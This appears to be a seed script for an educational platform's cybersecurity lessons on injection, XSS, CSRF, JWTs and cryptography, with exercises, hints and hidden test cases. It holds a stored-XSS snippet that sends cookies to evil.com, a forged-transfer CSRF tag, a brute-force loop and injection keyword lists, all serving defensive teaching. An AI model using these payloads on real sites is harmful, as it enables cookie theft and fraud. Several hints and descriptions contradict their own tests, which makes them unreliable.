          { input: 'sanitize_input("select * from users")', expectedOutput: ' * from users', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'SQL Query Builder',
        slug: 'sql-query-builder',
        description: 'Write a function `build_query(table, columns, conditions)` that takes a table name (string), a list of column names (strings), and a dict of conditions (column → value), and returns a safe parameterized SQL SELECT query. Use parameterized placeholders `?` for all condition values. For example, `build_query("users", ["name", "email"], {"id": 1, "active": True})` returns `"SELECT name, email FROM users WHERE id = ? AND active = ?"`.',
        starterCode: `def build_query(table, columns, conditions):
    # Build a safe parameterized SELECT query
    pass`,
        language: 'python',
        order: 4,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Build the SELECT clause from columns joined by ", ". Build the WHERE clause from conditions using "column = ?" joined by " AND ". Never interpolate values directly.', xpCost: 5 },
          { level: 2, content: 'SELECT clause: `", ".join(columns)`. WHERE clause: `" AND ".join(f"{col} = ?" for col in conditions)`. Combine: `f"SELECT {select_clause} FROM {table} WHERE {where_clause}"`.', xpCost: 10 },
          { level: 3, content: 'Complete: build SELECT and WHERE clauses using join(), combine into a parameterized query string. Handle the case where there are no conditions.', xpCost: 20 },
        ],
        testCases: [
          { input: 'build_query("users", ["name", "email"], {"id": 1, "active": True})', expectedOutput: 'SELECT name, email FROM users WHERE id = ? AND active = ?', isHidden: false, order: 1 },
          { input: 'build_query("products", ["*"], {"category": "books"})', expectedOutput: 'SELECT * FROM products WHERE category = ?', isHidden: false, order: 2 },
          { input: 'build_query("logs", ["msg"], {"level": "error", "source": "auth"})', expectedOutput: 'SELECT msg FROM logs WHERE level = ? AND source = ?', isHidden: true, order: 3 },
          { input: 'build_query("data", ["id"], {"x": 1})', expectedOutput: 'SELECT id FROM data WHERE x = ?', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Injection Pattern Classifier',
        slug: 'injection-pattern-classifier',
        description: 'Write a function `classify_injection(input_str)` that takes a string and returns the type of injection detected: `"sql"` if it contains SQL patterns (`UNION`, `SELECT`, `DROP`, `1=1`, `--`, `OR 1`), `"xss"` if it contains `<script>`, `onerror`, `onload`, `javascript:`, or `"none"` if neither. Check SQL patterns first. For example, `classify_injection("<script>alert(1)</script>")` returns `"xss"`.',
        starterCode: `def classify_injection(input_str):
    # Classify input as "sql", "xss", or "none"
    pass`,
        language: 'python',
        order: 5,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Convert to lowercase. Check SQL patterns first: `union`, `select`, `drop`, `1=1`, `--`, `or 1`. Then check XSS patterns: `<script`, `onerror`, `onload`, `javascript:`. Return "none" if neither.', xpCost: 5 },
          { level: 2, content: 'SQL patterns: `["union", "select", "drop", "1=1", "--", "or 1"]`. XSS patterns: `["<script", "onerror", "onload", "javascript:"]`. `lower = input_str.lower()`. Check SQL first, then XSS.', xpCost: 10 },
          { level: 3, content: 'Complete: two lists of patterns, check in order (SQL first), return first match category or "none".', xpCost: 20 },
        ],
        testCases: [
          { input: 'classify_injection("<script>alert(1)</script>")', expectedOutput: 'xss', isHidden: false, order: 1 },
          { input: 'classify_injection("1 UNION SELECT * FROM users")', expectedOutput: 'sql', isHidden: false, order: 2 },
          { input: 'classify_injection("normal input")', expectedOutput: 'none', isHidden: true, order: 3 },
          { input: 'classify_injection("img onerror=alert(1)")', expectedOutput: 'xss', isHidden: true, order: 4 },
          { input: 'classify_injection("\' OR 1=1--")', expectedOutput: 'sql', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 5

  // Lesson 4.2: XSS & CSRF
  const lesson4_2 = await createLessonWithExercises(phases[3].id, {
    title: 'XSS & CSRF',
    slug: 'xss-and-csrf',
    description: 'Understand Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) — two of the most prevalent web attacks that target users rather than servers.',
    contentMdx: `# XSS & CSRF

While SQL injection attacks the database, **XSS** and **CSRF** attack the **user**. These client-side vulnerabilities are widespread, dangerous, and often underestimated.

## Cross-Site Scripting (XSS)

XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. The attacker injects malicious JavaScript that executes in the victim's browser.

### Stored XSS (Persistent)

The malicious script is **stored** on the server (e.g., in a comment, profile field) and served to every user who views the page:

\`\`\`html
<!-- Attacker posts this comment -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
\`\`\`

Every user who views the comment has their cookies stolen.

### Reflected XSS (Non-Persistent)

The malicious script is **reflected** back from the server in the response — typically via a URL parameter:

\`\`\`
https://example.com/search?q=<script>alert('XSS')</script>
\`\`\`

The server embeds the search term in the response without escaping, and the script executes.

### DOM-Based XSS

The vulnerability exists entirely in client-side JavaScript — the server never sees the payload:

\`\`\`javascript
// VULNERABLE: Directly inserting URL fragment into DOM
document.getElementById("output").innerHTML = location.hash.slice(1);
\`\`\`

### XSS Prevention

1. **Output encoding**: Escape all user input based on context (HTML, JavaScript, URL, CSS)
2. **Content Security Policy (CSP)**: Restrict which scripts can execute
3. **HTTP-only cookies**: Prevent JavaScript from accessing session cookies
4. **Input validation**: Validate and sanitize all user input

## Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user into performing an unwanted action on a site where they are already logged in:

\`\`\`html
<!-- Attacker's page — victim visits this -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
\`\`\`

If the victim is logged into their bank, the browser automatically sends the session cookie with this request — and the transfer goes through!

### CSRF Prevention

1. **CSRF Tokens**: Include a unique, unpredictable token in every state-changing form
2. **SameSite cookies**: Set \`SameSite=Strict\` or \`SameSite=Lax\` on session cookies
3. **Verify Origin header**: Check that requests come from your own domain
4. **Double-submit cookie**: Send the token in both a cookie and a request parameter

### XSS + CSRF = Full Account Takeover

XSS can bypass CSRF protections! If an attacker can execute JavaScript via XSS, they can:
- Read CSRF tokens from the page
- Submit forms on behalf of the user
- Steal session cookies (if not HTTP-only)

This is why **defense in depth** is critical — no single defense is sufficient.

## HTML Sanitization

When you must accept HTML input (e.g., rich text editors), sanitize it:

\`\`\`python
def sanitize_html(html_input):
    # Remove dangerous tags and attributes
    dangerous_tags = ['script', 'iframe', 'object', 'embed', 'form']
    for tag in dangerous_tags:
        html_input = html_input.replace(f'<{tag}', f'&lt;{tag}')
        html_input = html_input.replace(f'</{tag}', f'&lt;/{tag}')
    # Remove event handlers
    import re
    html_input = re.sub(r'on\\w+\\s*=', '', html_input)
    return html_input
\`\`\`

Always use a well-tested sanitization library (like DOMPurify on the client side) rather than rolling your own — the nuances of HTML parsing make DIY sanitization error-prone.`,
    order: 2,
    xpReward: 75,
    category: 'cyber',
    exercises: [
      {
        title: 'XSS Sanitizer',
        slug: 'xss-sanitizer',
        description: 'Write a function `sanitize_html(html)` that removes dangerous HTML tags (`<script>`, `<iframe>`, `<object>`, `<embed>`) and event handler attributes (`onclick`, `onerror`, `onload`, etc. — any attribute starting with `on`) from the input string. Replace dangerous opening tags with `&lt;tagname` and remove `on*` attributes entirely.',
        starterCode: `def sanitize_html(html):
    # Remove dangerous tags and on* event handlers
    pass`,
        language: 'python',
        order: 1,
        xpReward: 35,
        hints: [
          { level: 1, content: 'For dangerous tags: replace `<script`, `<iframe`, `<object`, `<embed` with their escaped versions. For event handlers: use regex `on\\w+\\s*=` to find and remove them.', xpCost: 5 },
          { level: 2, content: 'Step 1: `for tag in ["script", "iframe", "object", "embed"]: html = html.replace(f"<{tag}", f"&lt;{tag}")`. Step 2: `import re; html = re.sub(r"on\\w+\\s*=", "", html, flags=re.IGNORECASE)`. Return the cleaned string.', xpCost: 10 },
          { level: 3, content: 'Complete: iterate dangerous tags to escape opening tags, then use `re.sub(r"on\\w+\\s*=", "", html, flags=re.IGNORECASE)` to strip event handlers.', xpCost: 20 },
        ],
        testCases: [
          { input: 'sanitize_html("<script>alert(1)</script>")', expectedOutput: '&lt;script>alert(1)</script>', isHidden: false, order: 1 },
          { input: 'sanitize_html("<p>Hello</p>")', expectedOutput: '<p>Hello</p>', isHidden: false, order: 2 },
          { input: 'sanitize_html(\'<img src=x onerror=alert(1)>\')', expectedOutput: '<img src=x >', isHidden: true, order: 3 },
          { input: 'sanitize_html("<iframe src=\\"evil.com\\"></iframe>")', expectedOutput: '&lt;iframe src="evil.com"></iframe>', isHidden: true, order: 4 },
          { input: 'sanitize_html("<div onclick=\\"evil()\\">Click</div>")', expectedOutput: '<div >Click</div>', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'URL Parameter Analyzer',
        slug: 'url-parameter-analyzer',
        description: 'Write a function `analyze_url(url)` that takes a URL string and returns a dict with keys `"path"` and `"params"`. The path is everything before the `?`. The params is a dict of query parameter key-value pairs. For example, `analyze_url("https://example.com/search?q=hello&page=2")` returns `{"path": "https://example.com/search", "params": {"q": "hello", "page": "2"}}`.',
        starterCode: `def analyze_url(url):
    # Parse URL into path and query parameters
    pass`,
        language: 'python',
        order: 2,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Split the URL on "?"". If no "?", path is the whole URL and params is empty. Otherwise, split the query string on "&" to get key=value pairs.', xpCost: 5 },
          { level: 2, content: 'Split on "?": parts = url.split("?", 1). path = parts[0]. If len(parts) > 1: parse params by splitting on "&", then each on "=". Build a dict.', xpCost: 10 },
          { level: 3, content: 'Complete: handle the case where there are no query parameters. For each param, split on "=" and handle missing values.', xpCost: 20 },
        ],
        testCases: [
          { input: 'analyze_url("https://example.com/search?q=hello&page=2")', expectedOutput: "{'path': 'https://example.com/search', 'params': {'q': 'hello', 'page': '2'}}", isHidden: false, order: 1 },
          { input: 'analyze_url("https://example.com/home")', expectedOutput: "{'path': 'https://example.com/home', 'params': {}}", isHidden: false, order: 2 },
          { input: 'analyze_url("http://site.com/api?key=abc123&format=json")', expectedOutput: "{'path': 'http://site.com/api', 'params': {'key': 'abc123', 'format': 'json'}}", isHidden: true, order: 3 },
          { input: 'analyze_url("https://x.com/?redirect=https://evil.com")', expectedOutput: "{'path': 'https://x.com/', 'params': {'redirect': 'https://evil.com'}}", isHidden: true, order: 4 },
        ],
      },
      {
        title: 'CSRF Token Validator',
        slug: 'csrf-token-validator',
        description: 'Write a function `validate_csrf(session_token, form_token)` that takes two strings: a CSRF token from the session and one from the form submission. Returns `True` if both tokens are non-empty strings and are exactly equal, `False` otherwise. This simulates the server-side check that prevents CSRF attacks.',
        starterCode: `def validate_csrf(session_token, form_token):
    # Validate CSRF token match
    pass`,
        language: 'python',
        order: 3,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Check both tokens are non-empty and equal. An empty or missing token should always fail validation.', xpCost: 5 },
          { level: 2, content: 'Return `bool(session_token and form_token and session_token == form_token)`. The `and` short-circuits on empty strings.', xpCost: 10 },
          { level: 3, content: 'Complete: `def validate_csrf(s, f): return bool(s and f and s == f)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'validate_csrf("abc123", "abc123")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'validate_csrf("abc123", "xyz789")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'validate_csrf("", "abc123")', expectedOutput: 'False', isHidden: true, order: 3 },
          { input: 'validate_csrf("token", "")', expectedOutput: 'False', isHidden: true, order: 4 },
          { input: 'validate_csrf("", "")', expectedOutput: 'False', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'CSP Header Builder',
        slug: 'csp-header-builder',
        description: 'Write a function `build_csp(rules)` that takes a dict of Content Security Policy directives and returns the CSP header value string. Directives map to lists of allowed sources. Use "self" for same-origin, "none" for no sources, and "*" for wildcard. For example, build_csp({"script-src": ["self", "cdn.example.com"], "style-src": ["self"]}) returns "script-src \'self\' cdn.example.com; style-src \'self\'".',
        starterCode: `def build_csp(rules):
    # Build a Content-Security-Policy header value from rules dict
    pass`,
        language: 'python',
        order: 4,
        xpReward: 35,
        hints: [
          { level: 1, content: 'For each directive, join its sources with spaces. Wrap "self" and "none" in single quotes. Join all directives with "; ".', xpCost: 5 },
          { level: 2, content: 'For each key, value pair: format sources as `"\'self\'"` if "self", `"\'none\'"` if "none", else the source string. Join: `key + " " + " ".join(formatted_sources)`. Join directives with "; ".', xpCost: 10 },
          { level: 3, content: 'Complete: iterate dict items, format special keywords with quotes, join sources with spaces, join directives with semicolons.', xpCost: 20 },
        ],
        testCases: [
          { input: 'build_csp({"script-src": ["self", "cdn.example.com"], "style-src": ["self"]})', expectedOutput: "script-src 'self' cdn.example.com; style-src 'self'", isHidden: false, order: 1 },
          { input: 'build_csp({"default-src": ["none"]})', expectedOutput: "default-src 'none'", isHidden: false, order: 2 },
          { input: 'build_csp({"img-src": ["*", "data:"]})', expectedOutput: "img-src * data:", isHidden: true, order: 3 },
          { input: 'build_csp({"script-src": ["self"], "img-src": ["self"], "style-src": ["self"]})', expectedOutput: "script-src 'self'; img-src 'self'; style-src 'self'", isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Cookie Security Analyzer',
        slug: 'cookie-security-analyzer',
        description: 'Write a function `analyze_cookie(set_cookie_header)` that takes a Set-Cookie header value and returns a dict with keys `"name"`, `"value"`, `"secure"`, `"httpOnly"`, `"sameSite"`. The name and value come from the first `name=value` pair. The flags are `True`/`False` based on their presence. If SameSite is present, include its value (e.g., "Strict", "Lax"). For example, `analyze_cookie("session=abc123; Secure; HttpOnly; SameSite=Strict")` returns `{"name": "session", "value": "abc123", "secure": True, "httpOnly": True, "sameSite": "Strict"}`.',
        starterCode: `def analyze_cookie(set_cookie_header):
    # Parse Set-Cookie header and analyze security properties
    pass`,
        language: 'python',
        order: 5,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Split by ";". The first part is name=value. For remaining parts, check for "Secure" (case-insensitive), "HttpOnly", and "SameSite=".', xpCost: 5 },
          { level: 2, content: 'Split on ";", strip whitespace. First element: split on "=" for name and value. Check `any("secure" in p.lower() for p in parts[1:])` for Secure flag. Similar for HttpOnly. For SameSite, find the part starting with "SameSite=" and extract the value.', xpCost: 10 },
          { level: 3, content: 'Complete: parse the header, extract name/value from first segment, check flags in remaining segments. Default sameSite to None or "None" if not present.', xpCost: 20 },
        ],
        testCases: [
          { input: 'analyze_cookie("session=abc123; Secure; HttpOnly; SameSite=Strict")', expectedOutput: "{'name': 'session', 'value': 'abc123', 'secure': True, 'httpOnly': True, 'sameSite': 'Strict'}", isHidden: false, order: 1 },
          { input: 'analyze_cookie("id=x")', expectedOutput: "{'name': 'id', 'value': 'x', 'secure': False, 'httpOnly': False, 'sameSite': None}", isHidden: false, order: 2 },
          { input: 'analyze_cookie("token=secret; Secure")', expectedOutput: "{'name': 'token', 'value': 'secret', 'secure': True, 'httpOnly': False, 'sameSite': None}", isHidden: true, order: 3 },
          { input: 'analyze_cookie("js=sid; HttpOnly; SameSite=Lax")', expectedOutput: "{'name': 'js', 'value': 'sid', 'secure': False, 'httpOnly': True, 'sameSite': 'Lax'}", isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 5

  // Lesson 4.3: Authentication Flaws
  const lesson4_3 = await createLessonWithExercises(phases[3].id, {
    title: 'Authentication Flaws',
    slug: 'authentication-flaws',
    description: 'Learn about broken authentication — weak passwords, session management issues, and token vulnerabilities that let attackers impersonate users.',
    contentMdx: `# Authentication Flaws

Broken authentication is consistently in the OWASP Top 10 because it is both common and devastating. When authentication fails, attackers gain unauthorized access to user accounts — and from there, they can escalate privileges, steal data, and compromise entire systems.

## Common Authentication Vulnerabilities

### 1. Weak Password Policies

Allowing users to set "123456" or "password" as their password is an open invitation for credential stuffing attacks. Strong password policies require:
- Minimum 8 characters (preferably 12+)
- No commonly breached passwords (check against HaveIBeenPwned)
- Multi-factor authentication (MFA)

### 2. Credential Stuffing

Attackers take leaked username/password pairs from one breach and try them on other sites. **Why it works**: 65% of people reuse passwords across sites.

**Defense**: Rate limiting, CAPTCHA, MFA, breach-detection APIs.

### 3. Brute Force Attacks

Attackers systematically try every possible password:

\`\`\`python
# Conceptual brute force (do NOT use maliciously!)
for password in wordlist:
    if try_login(username, password):
        print(f"Found: {password}")
        break
\`\`\`

**Defense**: Account lockout, progressive delays, rate limiting, MFA.

### 4. Session Fixation

The attacker sets the victim's session ID before they log in. After the victim authenticates, the attacker uses the known session ID to hijack the session.

**Defense**: Always regenerate the session ID after login.

### 5. Insecure Token Storage

Storing tokens in \`localStorage\` makes them accessible to any JavaScript on the page — including XSS payloads. Store tokens in **HTTP-only, Secure, SameSite cookies** instead.

## JSON Web Tokens (JWT)

JWTs are the most common modern authentication mechanism. A JWT has three parts:

\`\`\`
header.payload.signature
\`\`\`

- **Header**: Algorithm and token type (Base64URL encoded)
- **Payload**: Claims — user ID, role, expiration (Base64URL encoded)
- **Signature**: HMAC or RSA signature over header + payload

### Common JWT Vulnerabilities

1. **Algorithm confusion**: Setting \`"alg": "none"\` to bypass signature verification
2. **Weak secrets**: Using "secret" or "password" as the HMAC key
3. **No expiration**: Tokens that never expire can be used forever
4. **Sensitive data in payload**: Base64 is encoding, NOT encryption — anyone can read it

\`\`\`python
import base64
import json

# Anyone can decode a JWT payload!
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.signature"
payload = token.split(".")[1]
# Add padding
payload += "=" * (4 - len(payload) % 4)
decoded = json.loads(base64.b64decode(payload))
print(decoded)  # {"user": "alice", "role": "admin"}
\`\`\`

## Token Validation Checklist

When validating an authentication token, always check:
1. **Structure**: Correct format (3 dot-separated parts for JWT)
2. **Signature**: Cryptographically valid
3. **Expiration**: Not expired
4. **Issuer**: Issued by a trusted authority
5. **Audience**: Intended for your application
6. **Claims**: All required fields present and valid

Authentication is the gatekeeper of your application. Get it wrong, and nothing else matters — an attacker with valid credentials has the same access as a legitimate user.`,
    order: 3,
    xpReward: 75,
    category: 'cyber',
    exercises: [
      {
        title: 'Token Validator',
        slug: 'token-validator',
        description: 'Write a function `validate_jwt_structure(token)` that takes a string and returns `True` if it has a valid JWT-like structure (three Base64URL-encoded segments separated by dots), `False` otherwise. Each segment must be non-empty and contain only valid Base64URL characters (A-Z, a-z, 0-9, -, _).',
        starterCode: `import re

def validate_jwt_structure(token):
    # Return True if token has valid JWT structure (3 base64url segments)
    pass`,
        language: 'python',
        order: 1,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Split the token by "." and verify there are exactly 3 parts. Then check each part contains only Base64URL characters: A-Z, a-z, 0-9, dash, underscore.', xpCost: 5 },
          { level: 2, content: 'Split by ".", check len == 3. For each part: `bool(re.match(r"^[A-Za-z0-9_-]+$", part))` and part is non-empty. All conditions must pass.', xpCost: 10 },
          { level: 3, content: 'Complete: `def validate_jwt_structure(token): parts = token.split("."); return len(parts) == 3 and all(re.match(r"^[A-Za-z0-9_-]+$", p) for p in parts if p)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'validate_jwt_structure("eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UifQ.c2lnbmF0dXJl")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'validate_jwt_structure("not.a.valid.jwt!")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'validate_jwt_structure("header.payload")', expectedOutput: 'False', isHidden: true, order: 3 },
          { input: 'validate_jwt_structure("a.b.c")', expectedOutput: 'True', isHidden: true, order: 4 },
          { input: 'validate_jwt_structure("..signature")', expectedOutput: 'False', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'JWT Payload Decoder',
        slug: 'jwt-payload-decoder',
        description: 'Write a function `decode_jwt_payload(token)` that takes a JWT string, extracts the payload (middle segment), decodes it from Base64URL, and returns the resulting JSON string. Add padding as needed. For example, `decode_jwt_payload("header.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.signature")` returns `\'{"user":"alice","role":"admin"}\' `.',
        starterCode: `import base64
import json

def decode_jwt_payload(token):
    # Decode and return the JWT payload as a JSON string
    pass`,
        language: 'python',
        order: 2,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Split the token by ".", take the middle segment (index 1). Add Base64 padding: `payload += "=" * (4 - len(payload) % 4)`. Decode with `base64.urlsafe_b64decode()`.', xpCost: 5 },
          { level: 2, content: 'Steps: `parts = token.split(".")`, `payload = parts[1]`, `payload += "=" * (4 - len(payload) % 4)`, `decoded = base64.urlsafe_b64decode(payload).decode()`, return `decoded`.', xpCost: 10 },
          { level: 3, content: 'Complete: split, pad, decode with urlsafe_b64decode, return decoded string. Handle the padding edge case when remainder is 0.', xpCost: 20 },
        ],
        testCases: [
          { input: 'decode_jwt_payload("header.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.signature")', expectedOutput: '{"user":"alice","role":"admin"}', isHidden: false, order: 1 },
          { input: 'decode_jwt_payload("a.eyJpZCI6MX0.c")', expectedOutput: '{"id":1}', isHidden: false, order: 2 },
          { input: 'decode_jwt_payload("x.eyJmbGFnIjoiWlREe2gzaWQzbl9qc3d9In0.z")', expectedOutput: '{"flag":"ZTD{h3id3n_jsw}"}', isHidden: true, order: 3 },
          { input: 'decode_jwt_payload("h.eyJleHAiOjE3MDAwMDAwMDB9.s")', expectedOutput: '{"exp":1700000000}', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Rate Limiter',
        slug: 'rate-limiter',
        description: 'Write a function `check_rate_limit(attempts, max_attempts)` that takes a list of timestamps (floats, seconds since epoch) representing login attempts and an integer `max_attempts`. Return `True` if there are fewer than `max_attempts` attempts in the most recent 60-second window, `False` otherwise. For example, `check_rate_limit([100.0, 101.0, 102.0, 103.0, 104.0], 5)` at current time 160 returns `True` (all within 60s but only 5, equal to limit is still rate-limited).',
        starterCode: `def check_rate_limit(attempts, max_attempts):
    # Return True if under rate limit, False if at or over limit
    pass`,
        language: 'python',
        order: 3,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Filter attempts to only those within the last 60 seconds. Count them. If count >= max_attempts, rate limit is hit.', xpCost: 5 },
          { level: 2, content: 'Use the last timestamp as "now": `now = max(attempts) if attempts else 0`. Count: `recent = sum(1 for t in attempts if now - t < 60)`. Return `recent < max_attempts`.', xpCost: 10 },
          { level: 3, content: 'Note: this function uses the max timestamp as "now" for deterministic testing. Return `recent < max_attempts`.', xpCost: 20 },
        ],
        testCases: [
          { input: 'check_rate_limit([100.0, 101.0, 102.0, 103.0, 104.0], 5)', expectedOutput: 'False', isHidden: false, order: 1 },
          { input: 'check_rate_limit([100.0, 101.0], 5)', expectedOutput: 'True', isHidden: false, order: 2 },
          { input: 'check_rate_limit([10.0, 20.0, 100.0], 2)', expectedOutput: 'False', isHidden: true, order: 3 },
          { input: 'check_rate_limit([1.0, 2.0, 100.0], 3)', expectedOutput: 'True', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Password Hash Comparator',
        slug: 'password-hash-comparator',
        description: 'Write a function `verify_password(password, stored_hash)` that takes a plaintext password and a stored SHA-256 hash (hex string), computes the SHA-256 hash of the password, and returns `True` if they match, `False` otherwise. Use constant-time comparison (`hmac.compare_digest`) to prevent timing attacks. For example, `verify_password("hello", "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824")` returns `True`.',
        starterCode: `import hashlib
import hmac

def verify_password(password, stored_hash):
    # Verify password against stored hash using constant-time comparison
    pass`,
        language: 'python',
        order: 4,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Compute SHA-256 of the password: `hashlib.sha256(password.encode()).hexdigest()`. Then use `hmac.compare_digest()` to compare with the stored hash.', xpCost: 5 },
          { level: 2, content: 'Compute: `computed = hashlib.sha256(password.encode()).hexdigest().lower()`. Return `hmac.compare_digest(computed, stored_hash.lower())`.', xpCost: 10 },
          { level: 3, content: 'Complete: always use hmac.compare_digest for password comparison — it prevents timing attacks by taking constant time regardless of where the first mismatch occurs.', xpCost: 20 },
        ],
        testCases: [
          { input: 'verify_password("hello", "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'verify_password("wrong", "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'verify_password("password", "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8")', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: 'verify_password("", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")', expectedOutput: 'True', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Session Token Generator',
        slug: 'session-token-generator',
        description: 'Write a function `generate_session_token(user_id, timestamp, secret)` that takes a user ID string, a timestamp integer, and a secret string, and returns a session token in the format `"{user_id}.{timestamp}.{signature}"` where the signature is the first 16 characters of the HMAC-SHA256 of `"{user_id}.{timestamp}"` using the secret as the key. For example, `generate_session_token("user1", 1000, "secret")` returns a token like `"user1.1000.a1b2c3d4e5f6a7b8"`.',
        starterCode: `import hmac
import hashlib

def generate_session_token(user_id, timestamp, secret):
    # Generate a session token with HMAC signature
    pass`,
        language: 'python',
        order: 5,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Build the message: `f"{user_id}.{timestamp}"`. Compute HMAC-SHA256: `hmac.new(secret.encode(), message.encode(), hashlib.sha256).hexdigest()`. Take first 16 chars of the hex digest.', xpCost: 5 },
          { level: 2, content: 'Message: `msg = f"{user_id}.{timestamp}"`. Signature: `sig = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()[:16]`. Return `f"{msg}.{sig}"`.', xpCost: 10 },
          { level: 3, content: 'Complete: concatenate user_id, timestamp, and truncated HMAC signature with dot separators.', xpCost: 20 },
        ],
        testCases: [
          { input: 'generate_session_token("user1", 1000, "secret")', expectedOutput: 'user1.1000.08f2b14184b2b800', isHidden: false, order: 1 },
          { input: 'generate_session_token("admin", 0, "key")', expectedOutput: 'admin.0.2f48f03e79ce0323', isHidden: false, order: 2 },
          { input: 'generate_session_token("test", 999, "mysecret")', expectedOutput: 'test.999.1dad87c4366a8569', isHidden: true, order: 3 },
          { input: 'generate_session_token("a", 1, "x")', expectedOutput: 'a.1.d75f09c00f5233fe', isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 5

  // ============================================================
  // PHASE 5: ADVANCED SECURITY
  // ============================================================

  // Lesson 5.1: Cryptography
  const lesson5_1 = await createLessonWithExercises(phases[4].id, {
    title: 'Cryptography',
    slug: 'cryptography',
    description: 'Deep dive into cryptographic primitives — symmetric encryption, asymmetric encryption, hashing, and how they protect data in the real world.',
    contentMdx: `# Cryptography

Cryptography is the mathematical backbone of cybersecurity. It transforms readable data into unreadable ciphertext, protecting confidentiality, integrity, and authenticity. Without cryptography, there would be no secure web browsing, no encrypted messaging, and no digital trust.

## Symmetric Encryption

The same key encrypts and decrypts data. Think of it as a locked box where both parties have copies of the same key:

\`\`\`
Plaintext + Key → [Encrypt] → Ciphertext
Ciphertext + Key → [Decrypt] → Plaintext
\`\`\`

Common symmetric algorithms:
- **AES-256**: The gold standard — used by governments and banks worldwide
- **ChaCha20**: Faster on mobile devices, used in TLS 1.3
- **DES/3DES**: Legacy algorithms — DO NOT use (broken)

\`\`\`python
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

ciphertext = cipher.encrypt(b"Secret message")
plaintext = cipher.decrypt(ciphertext)
\`\`\`

### Modes of Operation

AES alone encrypts 16-byte blocks. Modes define how to chain blocks:
- **ECB** (Electronic Codebook): Each block encrypted independently — INSECURE (identical blocks produce identical ciphertext)
- **CBC** (Cipher Block Chaining): Each block XORed with previous ciphertext — requires IV
- **GCM** (Galois/Counter Mode): Provides both encryption and authentication — modern standard

## Asymmetric Encryption

Two different but mathematically related keys: a **public key** (shared openly) and a **private key** (kept secret):

\`\`\`
Plaintext + Public Key → [Encrypt] → Ciphertext
Ciphertext + Private Key → [Decrypt] → Plaintext
\`\`\`

Common asymmetric algorithms:
- **RSA**: The original, based on factoring large primes
- **ECC** (Elliptic Curve Cryptography): Same security with smaller keys
- **Diffie-Hellman**: Secure key exchange over insecure channels

## Hashing

A hash function maps arbitrary-length input to a fixed-length output (digest). It is **one-way** — you cannot reverse a hash to recover the input:

\`\`\`python
import hashlib

sha256_hash = hashlib.sha256(b"password").hexdigest()
# 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
\`\`\`

Properties of a good hash function:
1. **Deterministic**: Same input always produces same output
2. **Fast to compute**: Efficient for verification
3. **Pre-image resistant**: Cannot reverse to find input
4. **Collision resistant**: Cannot find two inputs with same hash
5. **Avalanche effect**: Small input change → drastically different output

### Hashing vs Encryption

| Property | Hashing | Encryption |
|----------|---------|------------|
| Direction | One-way | Two-way |
| Key | No key | Requires key |
| Purpose | Integrity verification | Confidentiality |
| Example | Password storage | Secure communication |

### Password Hashing

**Never** use plain SHA-256 for passwords! Use **bcrypt**, **scrypt**, or **Argon2** — they add a **salt** and are deliberately slow to deter brute-force attacks:

\`\`\`python
import bcrypt

# Hashing
hashed = bcrypt.hashpw(b"password123", bcrypt.gensalt())

# Verification
bcrypt.checkpw(b"password123", hashed)  # True
\`\`\`

## Digital Signatures

Asymmetric encryption also enables **signatures** — proving a message came from a specific sender and was not tampered with:

\`\`\`
Message + Private Key → [Sign] → Signature
Message + Signature + Public Key → [Verify] → True/False
\`\`\`

This is how TLS certificates, software updates, and blockchain transactions work.

Cryptography is complex and subtle. A single implementation mistake can make your encryption worthless. Always use well-tested libraries and never roll your own crypto for production.`,
    order: 1,
    xpReward: 75,
    category: 'cyber',
    exercises: [
      {
        title: 'Hash Verifier',
        slug: 'hash-verifier',
